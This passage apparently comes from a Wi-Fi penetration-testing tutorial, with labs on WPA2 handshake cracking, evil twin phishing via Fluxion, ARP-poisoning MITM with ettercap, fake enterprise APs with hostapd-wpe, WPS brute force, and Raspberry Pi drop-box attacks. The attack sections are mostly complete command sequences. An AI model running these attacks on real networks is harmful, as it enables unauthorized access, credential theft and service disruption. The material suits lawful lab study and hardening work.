ls /usr/share/wordlists/
# rockyou.txt (14 million passwords — most commonly used)
# dirb/, dirbuster/ (web directories)

# Generate custom wordlist with crunch
crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -o custom.txt
# Generates all combinations 8-12 chars (WARNING: huge files!)

# Cupp — custom wordlist from personal info (OSINT-based)
# Useful for targeted attacks on known individuals
pip install cupp
cupp -i   # Interactive — enter target's name, birthday, etc.
```

### 14.4 Saving Dictionary Progress with John the Ripper

`aircrack-ng` restarts from the beginning if interrupted. Use `john` to pipe the wordlist with session saving:

```bash
# Start with session saving
john --wordlist=/root/password_list.txt --stdout \
  --session=my_session | \
  aircrack-ng -w - -b TARGET_BSSID /root/wpa_capture-01.cap

# To quit and resume: press 'q' in john's terminal
# john will save progress to ~/.john/my_session.rec

# Resume:
john --restore=my_session --stdout | \
  aircrack-ng -w - -b TARGET_BSSID /root/wpa_capture-01.cap

# Shows progress percentage — resume from exactly where left off
```

### 14.5 Rainbow Tables with Airolib-ng

PMK computation is the slow step (4096 PBKDF2 iterations per password). Pre-compute PMKs if you know the SSID in advance:

```bash
# Step 1: Create wordlist file
# (already have /root/password_list.txt)

# Step 2: Create SSID file
echo "TargetNetworkName" > /root/ssid_list.txt

# Step 3: Create database and import
airolib-ng /root/pmk_database --import passwd /root/password_list.txt
airolib-ng /root/pmk_database --import essid /root/ssid_list.txt

# Step 4: Compute all PMKs (batch process — slow once, fast to use)
airolib-ng /root/pmk_database --batch

# Step 5: Use database with aircrack-ng (instant cracking!)
aircrack-ng -r /root/pmk_database /root/wpa_capture-01.cap
# Now takes < 1 second vs. minutes with live wordlist
```

**When to use rainbow tables:**

- You know the SSID before engagement (recon phase)
- Long dictionary attacks (100MB+ wordlists)
- Multiple targets with same SSID

---

## 15. Evil Twin Attack

### 15.1 Theory

```
EVIL TWIN ATTACK FLOW
══════════════════════════════════════════════════════════════

  LEGITIMATE NETWORK:                  ATTACKER CREATES:
  ┌────────────────┐                  ┌────────────────────┐
  │  "HomeNetwork" │                  │  "HomeNetwork"     │
  │  WPA2 locked   │                  │  OPEN (no password)│
  │                │                  │  Fake firmware page│
  └────────────────┘                  └────────────────────┘

  ATTACK STEPS:

  ① Create fake AP with SAME SSID as target (open, no password)

  ② Launch deauth attack against legitimate AP
     → Victim's device keeps disconnecting
     → Victim sees both "HomeNetwork" networks

  ③ Victim (frustrated) connects to the open one

  ④ Victim is shown a fake "Router Firmware Update" page:
     "Please enter your Wi-Fi password to continue update"

  ⑤ Victim enters password (thinking it's legitimate)

  ⑥ Attacker captures password + verifies it against
     pre-captured four-way handshake

  ADVANTAGES:                 DISADVANTAGES:
  ✓ No dictionary attack      ✗ Requires user interaction
  ✓ Always gets real password ✗ Social engineering element
  ✓ Works regardless of       ✗ Victim may become suspicious
    password complexity

══════════════════════════════════════════════════════════════
```

### 15.2 Practical with Fluxion

```bash
# Download Fluxion
cd /root
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion

# Run installer (check dependencies)
bash install/install.sh

# Launch
bash fluxion.sh
```

**Fluxion workflow:**

```
1. Select language (English)
2. Select channels to scan (all channels or specific)
3. Ctrl+C to stop scan → select target AP from list
4. Choose verification method → Handshake
5. Capture handshake → select "Deauthenticate clients"
6. Verify handshake → pyrite verification recommended
7. Create SSL certificate (for the fake page)
8. Choose attack type → Web Interface (captive portal page)
9. Select router brand template (matching victim's router)
10. Attack starts:
    - Deauth loop running against legitimate AP
    - Fake AP broadcasting same SSID
    - Web server serving firmware update page
11. When victim connects and enters password:
    → Password shown in terminal
    → Automatically verified against captured handshake
    → "Correct password" or "Wrong password" displayed
```

---

## 16. Captive Portal Attacks — ARP Poisoning / MITM

### 16.1 What Is a Captive Portal?

```
CAPTIVE PORTAL WORKFLOW
══════════════════════════════════════════════════════════════

  Attacker                  Captive Portal AP (open)
  connects  ──────────────► Open, no password required
                            Gets IP address
                            ┌─────────────────────────────┐
  Tries to browse any URL   │ REDIRECTED to login page:   │
  ──────────────────────►   │  - Hotel: room number + name│
                            │  - Coffee shop: email signup│
                            │  - Enterprise: username/pass│
                            └─────────────────────────────┘
                            After login → internet access

  Common locations: Hotels, airports, cafes, malls, hospitals

══════════════════════════════════════════════════════════════
```

### 16.2 ARP Protocol & ARP Poisoning Theory

**ARP (Address Resolution Protocol)** maps IP addresses to MAC addresses on a local network.

```
ARP TABLE EXAMPLE (shown by: arp -a  OR  arp -n)
══════════════════════════════════════════════════════════════

  Internet Address    Physical Address    Type
  192.168.1.1         00:1A:2B:3C:4D:5E   dynamic  (router)
  192.168.1.100       AA:BB:CC:11:22:33   dynamic  (laptop)
  192.168.1.101       DD:EE:FF:44:55:66   dynamic  (phone)

  Devices communicate by IP; they look up the MAC in ARP table
  to know where to send the Ethernet/Wi-Fi frame.

══════════════════════════════════════════════════════════════
```

**ARP Poisoning attack:**

```
NORMAL COMMUNICATION:
  Phone ──(to router)──► Router forwards to internet

ARP POISON ATTACK:
  Attacker sends to Phone:
  "I am the router (192.168.1.1). My MAC is ATTACKER_MAC"
  (ARP has NO authentication — phone believes this)

  Attacker sends to Router:
  "I am the phone (192.168.1.100). My MAC is ATTACKER_MAC"

  RESULT:
  Phone ──► Attacker ──► Router ──► Internet
  Router ──► Attacker ──► Phone

  Attacker receives ALL traffic in both directions → MITM
```

**Windows ARP table:**

```cmd
# View ARP table (Windows)
arp -a

# Linux
arp -n
# or
ip neigh show
```

### 16.3 MITM Attack with Ettercap

```bash
# Step 1: Connect your attacker machine to the captive portal AP
# (It's open — just connect like a normal user)

# Step 2: Launch ARP poisoning MITM
ettercap -TQ -M arp:remote -i wlan0 /// ///

# Flags:
# -T  = text mode
# -Q  = quiet (less verbose)
# -M arp:remote = ARP poisoning, remote mode (allows packet forwarding)
# -i wlan0 = interface
# /// /// = all hosts on both sides (gateway to clients and vice versa)

# Step 3: Capture traffic with Wireshark
wireshark &
# Select wlan0
# Filter: http
# Look for POST packets → right-click → Follow HTTP stream
# Find username/password fields in POST body
```

**Targeted ARP poisoning (specific client):**

```bash
# If you know the victim's IP and router IP:
ettercap -TQ -M arp:remote -i wlan0 \
  /192.168.1.1// /192.168.1.50//
# Poisons only between router (1.1) and victim (1.50)
```

> **Important:** This attack only captures **HTTP** traffic. HTTPS (TLS) traffic is encrypted and you'd need SSLstrip or other techniques to downgrade/intercept it.

---

## 17. WPA2 Enterprise

### 17.1 How Enterprise Works (RADIUS)

```
WPA2 PERSONAL vs. ENTERPRISE
══════════════════════════════════════════════════════════════

  PERSONAL                        ENTERPRISE
  ───────────────────────────     ────────────────────────────
  One shared password             Unique username + password
  All users same credentials      per user (from RADIUS server)
  Changing PW affects everyone    Disable individual accounts
  Suitable: home, small office    Suitable: corporations, schools

  ENTERPRISE ARCHITECTURE:
  ┌──────────┐                    ┌──────────────────┐
  │  Client  │──(username/pass)──►│   Access Point   │
  └──────────┘                    └────────┬─────────┘
                                           │ RADIUS protocol
                                           ▼
                                  ┌──────────────────┐
                                  │  RADIUS Server   │
                                  │  (FreeRADIUS,    │
                                  │   Windows NPS,   │
                                  │   Cisco ISE)     │
                                  │  User database   │
                                  └──────────────────┘
                                  "Does user1:pass123 exist
                                   and is account active?"
                                   YES → grant access
                                   NO  → deny

══════════════════════════════════════════════════════════════
```

**EAP (Extensible Authentication Protocol) types used in enterprise:**

| EAP Type | Notes                                        |
| -------- | -------------------------------------------- |
| PEAP     | Most common; tunnels MSCHAPv2 inside TLS     |
| EAP-TTLS | Similar to PEAP; more flexible inner methods |
| EAP-TLS  | Client certificates required; most secure    |
| EAP-FAST | Cisco's alternative to PEAP                  |

### 17.2 Fake Enterprise AP with Hostapd-WPE

```bash
# Install
apt install hostapd-wpe

# Edit config file
nano /etc/hostapd-wpe/hostapd-wpe.conf

# Key settings to modify:
# interface=wlan0       ← your adapter (must support AP mode)
# ssid=TargetOrgName    ← match the target's SSID exactly

# Check if your adapter supports AP mode:
iw phy phy0 info | grep "Supported interface modes" -A 10
# Must show: AP

# Kill conflicting services
airmon-ng check kill
service network-manager stop

# Launch fake enterprise AP
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Run deauth against legitimate enterprise AP (separate terminal, second adapter):
aireplay-ng --deauth 0 -a LEGIT_AP_BSSID other_wlan_mon

# When a victim connects to your fake AP and enters credentials:
# Terminal shows:
#   username: user1
#   challenge: [hex string]
#   response:  [hex string]
```

### 17.3 Cracking the Challenge/Response with Asleap

Enterprise WPA2 with PEAP/MSCHAPv2 doesn't transmit the password — it sends a challenge/response exchange. Asleap cracks it:

```bash
# asleap syntax
asleap -C CHALLENGE -R RESPONSE -W /root/wordlist.txt

# Example (copy challenge and response from hostapd-wpe output):
asleap \
  -C 5d:33:45:ab:cd:ef:12:34 \
  -R 11:22:33:44:55:66:77:88:99:aa:bb:cc:dd:ee:ff:00:11:22:33:44:55:66:77:88 \
  -W /usr/share/wordlists/rockyou.txt

# Output:
#   username: user1
#   password: test123
```

---

## 18. Raspberry Pi Hacking Hardware

### 18.1 What Is Raspberry Pi?

```
RASPBERRY PI — OVERVIEW
══════════════════════════════════════════════════════════════

  A fully functional single-board computer:
  - Size: credit card (~85mm × 56mm)
  - Cost: $35–$55 USD
  - OS: Linux (Raspbian/Raspberry Pi OS, Kali ARM, etc.)
  - Uses: Education, electronics projects, IoT, pen testing

  WHY USE IT FOR WIRELESS HACKING?
  ✓ Small and concealable (place near target AP)
  ✓ Battery-powered (power bank = no wall outlet needed)
  ✓ Supports multiple USB Wi-Fi adapters
  ✓ Runs all same Kali tools (air-ng suite, reaver, etc.)
  ✓ Controllable remotely via VNC from your laptop
  ✓ Can run attacks 24/7 unattended

  USE CASES THAT RASPBERRY PI SOLVES:
  ① Target AP out of your laptop's range → place Pi nearby
  ② Long dictionary attacks (hours) → Pi runs overnight
  ③ Jam a network without using your own computer
  ④ Run multiple parallel attacks on different networks

══════════════════════════════════════════════════════════════
```

### 18.2 Components & Setup

**Hardware needed:**

| Item                       | Notes                                       |
| -------------------------- | ------------------------------------------- |
| **Raspberry Pi 3B / 3B+**  | Has built-in Wi-Fi + 4 USB ports + Ethernet |
| **Case**                   | Optional but protects board                 |
| **Micro SD card**          | 16–32 GB; acts as hard drive                |
| **Power bank**             | 5V output; standard phone power bank works  |
| **Micro USB cable**        | For power                                   |
| **2–3 USB Wi-Fi adapters** | External adapters for attack interfaces     |

**Raspberry Pi 3B ports:**

```
┌──────────────────────────────────────────┐
│  [USB x4]  [Ethernet]  [HDMI]            │ ← Front
│                                          │
│  [micro USB power]  [3.5mm audio]        │ ← Side
│                                          │
│  [micro SD slot]                         │ ← Bottom
│                                          │
│  [40-pin GPIO header]                    │ ← Top
└──────────────────────────────────────────┘
```

### 18.3 Installing Raspbian & Kali Tools

**Prepare Micro SD card (from Windows/Mac):**

```
Tools needed:
1. SD Card Formatter (sdcard.org)
2. Win32 Disk Imager (sourceforge.net)
3. Raspberry Pi OS image (raspberrypi.org → Downloads → Desktop version)

Steps:
1. Insert SD card into laptop via card reader
2. Open SD Card Formatter:
   - Select SD card drive
   - Options → Format type: Full
   - Enable Adjustment size
   - Format → OK
3. Unzip Raspberry Pi OS .zip file
4. Open Win32 Disk Imager:
   - Select .img file (from unzipped OS)
   - Select SD card drive letter
   - Write → Yes
   - Wait for completion
5. Safely eject SD card
6. Insert into Raspberry Pi (slot is on underside of board)
```

**First boot with monitor/keyboard:**

```bash
# Connect: monitor (HDMI), keyboard (USB), mouse (USB), power (micro USB)
# Default credentials: pi / raspberry

# After boot — update system:
sudo apt update && sudo apt upgrade -y

# Change default password:
passwd
```

**Install Kali tools on Raspbian:**

```bash
# Download Kali Linux tool installer for Raspberry Pi
git clone https://github.com/LionSec/katoolin.git
cd katoolin
python katoolin.py

# Menu options:
# 1) Add Kali repositories & Update
# 2) View Categories
#    → Category 3: Wireless Attacks
#      → Option 0: Install all wireless tools
#      OR select individual tools (aircrack-ng, reaver, etc.)

# Install specific tools manually:
sudo apt install aircrack-ng reaver mdk3 ettercap-text-only -y
```

### 18.4 Headless Operation via VNC

Control Raspberry Pi from your laptop **without a monitor or keyboard**.

```
VNC SETUP FLOW
══════════════════════════════════════════════════════════════

  Raspberry Pi (headless)          Your Laptop
  ┌─────────────────────┐          ┌──────────────────┐
  │ Connected to your   │◄────────►│ Connected to same│
  │ home router via     │  VNC     │ router via Wi-Fi  │
  │ built-in Wi-Fi      │  protocol│ or Ethernet      │
  │ VNC Server running  │          │ VNC Viewer app   │
  └─────────────────────┘          └──────────────────┘

══════════════════════════════════════════════════════════════
```

**Setup VNC on Raspberry Pi:**

```bash
# Install VNC server
sudo apt install realvnc-vnc-server realvnc-vnc-viewer -y

# Enable VNC
sudo raspi-config
# → Interface Options → VNC → Enable

# Or via GUI:
# Preferences → Raspberry Pi Configuration → Interfaces → VNC: Enabled
```

**Connect from your laptop:**

```
1. Install Advanced IP Scanner (Windows) or use nmap to find Pi's IP
   nmap -sn 192.168.1.0/24   (scan your subnet)
   Look for device named "raspberrypi"

2. Install VNC Viewer (realvnc.com/download/viewer)

3. Open VNC Viewer → Enter Pi's IP address
   Username: pi
   Password: raspberry  (or whatever you set)

4. You now see and control Pi's desktop from your laptop
```

**After VNC setup — operate completely headless:**

```bash
# Unplug: monitor, keyboard, mouse
# Keep: power bank connected, Wi-Fi adapters plugged in
# Place Raspberry Pi physically close to target AP
# Connect via VNC from your laptop anywhere on same network
```

### 18.5 Running Attacks from Raspberry Pi

```bash
# IMPORTANT: On Raspbian, you are NOT root by default
# Always prefix commands with: sudo

# Check adapters
ifconfig
# WLAN0 = built-in (for VNC connection to home router)
# WLAN1 = external adapter 1 (for attacks)
# WLAN2 = external adapter 2 (optional, for dual-adapter attacks)

# Monitor mode on external adapter
sudo ifconfig wlan1 down
sudo iwconfig wlan1 mode monitor
sudo ifconfig wlan1 up
sudo iwconfig   # Verify

# Sniff networks
sudo airodump-ng wlan1

# WPS attack
sudo wash -i wlan1
sudo reaver -i wlan1 -b TARGET_BSSID -c CHANNEL -vv

# Capture WPA handshake
sudo airodump-ng --bssid TARGET_BSSID --channel X \
  -w /home/pi/capture wlan1

# Deauth (on separate terminal or using second adapter)
sudo aireplay-ng --deauth 20 -a TARGET_BSSID wlan1

# Copy capture file to laptop for cracking
# (cracking on laptop is faster — better CPU)
scp pi@PI_IP_ADDRESS:/home/pi/capture-01.cap /root/
```

---

## 19. Wireless Security Hardening

| Recommendation                                                       | Why It Matters                                             |
| -------------------------------------------------------------------- | ---------------------------------------------------------- |
| **Use WPA2 or WPA3 Personal** (never WEP, never WPS PIN)             | WEP is trivially broken; WPS PIN vulnerable to brute force |
| **Use a strong passphrase** (20+ chars, not in any dictionary)       | Dictionary attacks fail against random passphrases         |
| **Disable WPS** in router admin panel                                | Eliminates WPS brute force attack surface entirely         |
| **Use WPA2/3 Enterprise** for organizations                          | Unique per-user credentials; easy account revocation       |
| **Enable Protected Management Frames (PMF/802.11w)**                 | Prevents deauthentication attacks; required for WPA3       |
| **Change default router admin credentials**                          | Prevents admin panel access via default passwords          |
| **Update router firmware regularly**                                 | Patches known vulnerabilities in router software           |
| **Segment guest/IoT networks**                                       | Attackers on guest network can't reach your main devices   |
| **Use strong passphrase format:** `Correct-Horse-Battery-Staple-77!` | Long, random, memorable — never in wordlists               |
| **Monitor for rogue APs**                                            | Detect evil twin attacks on your network                   |

**Generate a strong WPA2 key:**

```bash
# Generate random 20-character passphrase
openssl rand -base64 20

# Or use a passphrase: 4 random words + number + symbol
# e.g., "dragon-castle-purple-river-42!"
```

---

## 20. Comprehensive Lab Exercises

> ⚠️ **LEGAL & ETHICAL NOTICE**
> All labs below must be conducted **only** on:
>
> - Your own access points and test routers
> - Your own created websites (MERN/PERN)
> - Metasploitable2 in your isolated VM lab
> - Your own Raspberry Pi hardware
>
> Unauthorized wireless access or interception of others' traffic is illegal under computer crime laws in every jurisdiction.

---

### Lab 1: Monitor Mode & Packet Sniffing

**Objective:** Master the fundamental pre-requisite of all wireless attacks — monitor mode.

```bash
# Step 1: Plug in external USB Wi-Fi adapter
# Verify detection:
lsusb                    # See adapter in USB device list
ifconfig                 # Should show new wlan interface
iwconfig                 # Check adapter capabilities

# Step 2: Identify your adapter name
iwconfig
# Look for: wlan0, wlan1, etc. (not lo or eth0)

# Step 3: Enable monitor mode (try all three methods)
# Method 1:
airmon-ng start wlan0
iwconfig    # Verify mode: Monitor, new name: wlan0mon

# If method 1 fails, method 2:
airmon-ng check kill
airmon-ng start wlan0

# If both fail, method 3 (manual):
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
iwconfig wlan0    # Confirm: Mode:Monitor

# Step 4: Sniff all nearby networks
airodump-ng wlan0mon
# Observe: SSIDs, BSSIDs, channels, encryption types, signal levels

# Step 5: Capture a beacon frame in Wireshark
wireshark &
# Interface: wlan0mon
# Display filter: wlan.fc.type_subtype == 8
# Expand any beacon → Tagged parameters → read SSID, channel, security info

# Step 6: Restore managed mode
airmon-ng stop wlan0mon
```

**Document in your lab notes:**

- How many networks did you see?
- What encryption types are present?
- Can you identify the channels your own AP uses?
- What information is visible in the beacon frame?

---

### Lab 2: Deauthentication Attack

**Objective:** Understand how deauth attacks disrupt connectivity and enable handshake capture.

```bash
# Target: YOUR OWN access point and YOUR OWN device

# Step 1: Enable monitor mode
airmon-ng start wlan0

# Step 2: Identify your AP
airodump-ng wlan0mon
# Note: BSSID, Channel, SSID of YOUR test AP
# Note: Client MAC address of YOUR connected device

# Step 3: Broadcast deauth (disconnects ALL clients)
aireplay-ng --deauth 20 -a YOUR_AP_BSSID wlan0mon
# Observe: your device(s) disconnect

# Step 4: Targeted deauth (specific client only)
aireplay-ng --deauth 20 -a YOUR_AP_BSSID -c YOUR_DEVICE_MAC wlan0mon

# Step 5: Verify attack effect
# On the victim device: observe Wi-Fi disconnection notification
# Try browsing: connection fails during attack

# Step 6: Stop attack and observe reconnection
# Ctrl+C → victim device reconnects automatically

# Advanced: Wireshark capture of deauth frames
# In Wireshark → filter: wlan.fc.type_subtype == 12
# You'll see deauth frames with reason code 7 (class 3 frame from nonassociated STA)
```

---

### Lab 3: MAC Spoofing & Filtering Bypass

**Objective:** Bypass MAC whitelist filtering using MAC address cloning.

```bash
# Setup: Enable MAC whitelist on YOUR OWN test router
# Add only your phone's MAC to the whitelist
# Your Kali machine is NOT in the whitelist → should fail to connect

# Step 1: Verify your phone's MAC
# On Android: Settings → About → Status → Wi-Fi MAC address

# Step 2: Attempt connection from Kali (should fail)
# Try: nmcli device wifi connect "YourTestNetwork" password "pass"
# Result: Connection fails (MAC not in whitelist)

# Step 3: Sniff to find allowed MAC addresses
airmon-ng start wlan0
airodump-ng --bssid YOUR_AP_BSSID --channel X wlan0mon
# Find your phone's MAC in the Stations section

# Step 4: Clone the allowed MAC
airmon-ng stop wlan0mon    # Return to managed mode
ifconfig wlan0 down
macchanger -m PHONE_MAC_ADDRESS wlan0
ifconfig wlan0 up

# Step 5: Verify MAC change
macchanger -s wlan0

# Step 6: Attempt connection again
nmcli device wifi connect "YourTestNetwork" password "pass"
# Result: SUCCESS — router accepts the cloned MAC

# Step 7: Restore original MAC
ifconfig wlan0 down
macchanger -p wlan0      # Restore permanent/original MAC
ifconfig wlan0 up
```

---

### Lab 4: WEP Cracking

**Objective:** Crack a WEP-protected network to understand why it's deprecated.

```bash
# Setup: Configure your test router to use WEP encryption
# (Only do this on a dedicated test router — never on your main network)

# Step 1: Enable monitor mode
airmon-ng start wlan0

# Step 2: Find WEP network
airodump-ng wlan0mon
# Look for ENC: WEP in output

# Step 3: Targeted capture
airodump-ng --channel CH --bssid AP_BSSID -w /root/wep_lab wlan0mon

# Step 4: Start cracking in parallel
aircrack-ng /root/wep_lab-01.cap

# If traffic is low → inject with ARP replay:
# Terminal 2: Fake auth
aireplay-ng -1 0 -a AP_BSSID wlan0mon

# Terminal 3: ARP replay
aireplay-ng -3 -b AP_BSSID wlan0mon

# Watch #Data counter rise rapidly
# aircrack-ng will crack when sufficient IVs are collected

# SUCCESS: Note how fast WEP falls compared to WPA2
# Typical: < 60 seconds with sufficient traffic
```

---

### Lab 5: WPS Brute Force with Reaver

**Objective:** Test WPS PIN vulnerability on your own router.

```bash
# Step 1: Check if your router has WPS enabled
# Login to router admin page → Look for WPS settings

# Step 2: Enable monitor mode
airmon-ng start wlan0

# Step 3: List WPS-enabled networks
wash -i wlan0mon
# Find your test network, check Lck: No

# Step 4: Run Reaver
reaver -i wlan0mon -b YOUR_ROUTER_BSSID -c CHANNEL -vv

# Options to try if locked:
# -d 5     = 5 second delay between attempts (slower but avoids lockout)
# --no-nacks = skip NACK messages (helps with some routers)
# -t 10    = timeout per attempt

# Step 5: If lockout occurs
mdk3 wlan0mon a -a YOUR_ROUTER_BSSID
# Wait ~2 minutes, then verify unlock:
wash -i wlan0mon   # Lck should return to No

# Step 6: Resume after unlock
reaver -i wlan0mon -b YOUR_ROUTER_BSSID -c CHANNEL -vv -S
# -S = small DH keys (improves compatibility)

# RESULT: Note the WPS PIN and how Reaver derives the actual WPA password from it
# LESSON: Disable WPS on all your routers immediately after this lab
```

---

### Lab 6: WPA2 Four-Way Handshake Capture & Crack

**Objective:** Capture the WPA2 handshake and crack it with various methods.

```bash
# ──────────────────────────────────────────────────
# PART A: Capture the handshake
# ──────────────────────────────────────────────────

# Step 1: Monitor mode
airmon-ng start wlan0

# Step 2: Target your test WPA2 network
airodump-ng --bssid AP_BSSID --channel CH \
  --write /root/wpa_lab wlan0mon

# Step 3: Force handshake via deauth
# In another terminal:
aireplay-ng --deauth 20 -a AP_BSSID wlan0mon
# Watch top of airodump-ng → "WPA handshake: XX:XX:XX:XX:XX:XX"

# Verify capture:
aircrack-ng /root/wpa_lab-01.cap
# Should show: "1 handshake"

# ──────────────────────────────────────────────────
# PART B: Dictionary attack
# ──────────────────────────────────────────────────

# Create test wordlist containing your actual password
echo "testpassword1" > /root/test_wordlist.txt
echo "actualpassword" >> /root/test_wordlist.txt
echo "YourActualWiFiPassword" >> /root/test_wordlist.txt    # ← include real one

# Crack
aircrack-ng -w /root/test_wordlist.txt /root/wpa_lab-01.cap

# ──────────────────────────────────────────────────
# PART C: Session-saving with John the Ripper
# ──────────────────────────────────────────────────

john --wordlist=/root/test_wordlist.txt --stdout \
  --session=lab_session | \
  aircrack-ng -w - -b AP_BSSID /root/wpa_lab-01.cap

# Press 'q' to pause, then restore:
john --restore=lab_session --stdout | \
  aircrack-ng -w - -b AP_BSSID /root/wpa_lab-01.cap

# ──────────────────────────────────────────────────
# PART D: Rainbow tables
# ──────────────────────────────────────────────────

echo "YourTestNetwork" > /root/ssid.txt
airolib-ng /root/pmk_db --import passwd /root/test_wordlist.txt
airolib-ng /root/pmk_db --import essid /root/ssid.txt
airolib-ng /root/pmk_db --batch
aircrack-ng -r /root/pmk_db /root/wpa_lab-01.cap
# Note: this is nearly instant once DB is built
```

---

### Lab 7: Evil Twin Attack with Fluxion

**Objective:** Understand social engineering via fake AP firmware page.

```bash
# Step 1: Install Fluxion
cd /root
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion
bash install/install.sh

# Step 2: Pre-capture handshake manually (for verification later)
airmon-ng start wlan0
airodump-ng --bssid YOUR_TEST_AP --channel CH \
  -w /root/fluxion_handshake wlan0mon
# Send deauth → capture handshake → stop airodump
airmon-ng stop wlan0mon

# Step 3: Launch Fluxion
bash fluxion.sh

# Follow interactive menu:
# - Language: English
# - Scan: all channels
# - Ctrl+C when your test AP appears
# - Select your test AP from list
# - Handshake: use existing (select captured file)
# - Verify: pyrite
# - SSL: yes
# - Attack: Web Interface
# - Template: select brand matching your test router

# Step 4: Test on your own device
# Connect to the open AP with same SSID
# Enter WRONG password first → verify Fluxion rejects it
# Enter CORRECT password → verify Fluxion accepts and shows it in terminal

# LESSON: Note how convincing the fake page looks
# This demonstrates why users should verify AP authenticity
```

---

### Lab 8: MITM on Captive Portal

**Objective:** Intercept HTTP credentials on an open captive portal.

```bash
# Setup: Create a simple captive portal on your own server
# (Your MERN/PERN app with a login page, running locally)

# Step 1: Create a test AP (open, no password) on your router
# OR: use a phone hotspot (Android has option for open hotspot)

# Step 2: Connect your Kali machine to this open network

# Step 3: Launch ARP poisoning
ettercap -TQ -M arp:remote -i wlan0 /// ///

# Step 4: Open Wireshark
wireshark &
# Interface: wlan0
# Filter: http.request.method == "POST"

# Step 5: From a victim device (your phone), connect to open AP
# Browse to your test login page
# Enter username/password → submit

# Step 6: In Wireshark → find POST packet
# Right-click → Follow → HTTP Stream
# Find: user_name=... password=... fields in body

# IMPORTANT for your MERN/PERN apps:
# This attack only works on HTTP, NOT HTTPS
# Your web app should always use HTTPS in production
# Lab: Test your app on HTTP first, observe credential leak
# Then enable HTTPS, retry — credentials encrypted

# Enable HTTPS in Express.js:
# npm install https fs
# Use self-signed cert for testing:
```

```javascript
// HTTPS server in Node.js/Express (test environment)
const https = require('https')
const fs = require('fs')
const express = require('express')
const app = express()

const options = {
  key: fs.readFileSync('/path/to/key.pem'),
  cert: fs.readFileSync('/path/to/cert.pem'),
}

// Generate self-signed cert:
// openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

https.createServer(options, app).listen(443, () => {
  console.log('HTTPS server running on port 443')
})
```

---

### Lab 9: Raspberry Pi as Attack Hardware

**Objective:** Deploy a remote attack platform using Raspberry Pi.

```bash
# SETUP PHASE (with monitor/keyboard connected to Pi):

# Step 1: Install Raspbian OS (see Section 18.3)
# Step 2: Update system
sudo apt update && sudo apt upgrade -y

# Step 3: Install VNC and Kali tools
sudo apt install realvnc-vnc-server -y
sudo raspi-config   # → Interface → VNC → Enable
# Install attack tools:
sudo apt install aircrack-ng reaver mdk3 -y

# Step 4: Connect Pi to your home router via built-in Wi-Fi
# Step 5: Note Pi's IP (from router admin page or: hostname -I)

# OPERATIONAL PHASE (headless — no monitor):

# Step 6: Disconnect monitor/keyboard from Pi
# Place Pi near your test AP with power bank

# Step 7: Connect via VNC from laptop
# VNC Viewer → enter Pi's IP → login

# Step 8: Run attack from VNC session
sudo ifconfig wlan1 down
sudo iwconfig wlan1 mode monitor
sudo ifconfig wlan1 up

sudo airodump-ng wlan1   # See networks near Pi's physical location

# Capture handshake
sudo airodump-ng --bssid TEST_AP_BSSID --channel CH \
  -w /home/pi/remote_capture wlan1

# Deauth
sudo aireplay-ng --deauth 20 -a TEST_AP_BSSID wlan1

# Transfer capture file back to your laptop
scp pi@PI_IP:/home/pi/remote_capture-01.cap /root/
# Crack on your laptop (faster CPU)
aircrack-ng -w /usr/share/wordlists/rockyou.txt /root/remote_capture-01.cap
```

---

### Lab 10: Web App Testing via Rogue AP (Your MERN/PERN Sites)

**Objective:** Combine wireless attack with web application security testing.

```bash
# Scenario: Simulate an attacker creating a rogue hotspot to intercept
# traffic from users accessing your web app

# STEP 1: Create a rogue AP using hostapd (your own test AP)
# Install hostapd:
sudo apt install hostapd dnsmasq -y

# Configure hostapd
cat > /tmp/rogue_ap.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=FreeAirportWiFi
hw_mode=g
channel=6
auth_algs=1
EOF

# Configure DHCP with dnsmasq
cat > /tmp/dnsmasq.conf << 'EOF'
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.50,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
EOF

# Set up IP routing
sudo ifconfig wlan0 up 10.0.0.1 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo sysctl -w net.ipv4.ip_forward=1

# STEP 2: Start the rogue AP
sudo hostapd /tmp/rogue_ap.conf &
sudo dnsmasq -C /tmp/dnsmasq.conf &

# STEP 3: Connect your test device to "FreeAirportWiFi"

# STEP 4: Run ARP poisoning / packet capture
ettercap -TQ -M arp:remote -i wlan0 /// ///
# (In parallel) capture in Wireshark

# STEP 5: Access your own MERN/PERN test site from victim device
# Observe what an attacker on this rogue AP can see:
# - HTTP form fields (username, passwords)
# - Session tokens / cookies (if not HttpOnly/Secure)
# - API endpoint calls and parameters

# STEP 6: Harden your app based on findings:
```

```javascript
// Express.js security hardening for your web apps:

const express = require('express')
const helmet = require('helmet')
const session = require('express-session')

const app = express()

// Security headers
app.use(helmet())

// Secure session configuration
app.use(
  session({
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: {
      secure: true, // Only over HTTPS
      httpOnly: true, // Not accessible to JavaScript
      sameSite: 'strict', // Prevent CSRF
      maxAge: 3600000, // 1 hour
    },
  }),
)

// Force HTTPS redirect
app.use((req, res, next) => {
  if (req.headers['x-forwarded-proto'] !== 'https' && process.env.NODE_ENV === 'production') {
    return res.redirect(301, 'https://' + req.headers.host + req.url)
  }
  next()
})
```

---

## 21. Glossary

| Term                   | Definition                                                                               |
| ---------------------- | ---------------------------------------------------------------------------------------- |
| **802.11**             | IEEE standard family for wireless LAN (Wi-Fi) protocols                                  |
| **ANonce**             | Access Point Nonce — random value sent by AP in WPA handshake packet 1                   |
| **AP**                 | Access Point — device that creates the wireless network                                  |
| **ARP**                | Address Resolution Protocol — maps IP addresses to MAC addresses on LAN                  |
| **ARP Poisoning**      | Attack that sends fake ARP replies to redirect traffic through attacker                  |
| **Beacon Frame**       | 802.11 management frame broadcast by AP every ~100ms to announce its presence            |
| **BSSID**              | Basic Service Set Identifier — MAC address of an access point                            |
| **Captive Portal**     | Web page that intercepts all HTTP connections until the user authenticates               |
| **dBi**                | Decibels relative to isotropic — measure of antenna gain                                 |
| **dBm**                | Decibels relative to milliwatt — measure of transmit power                               |
